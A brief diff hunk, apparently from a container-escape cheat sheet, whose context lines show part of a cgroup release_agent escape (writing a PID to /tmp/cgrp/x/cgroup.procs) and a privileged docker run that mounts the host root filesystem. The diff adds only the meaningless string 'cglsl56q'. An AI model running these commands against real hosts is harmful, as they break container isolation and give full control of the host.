@@ -35,3 +35,5 @@ chmod +x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu bash
+
+cglsl56q
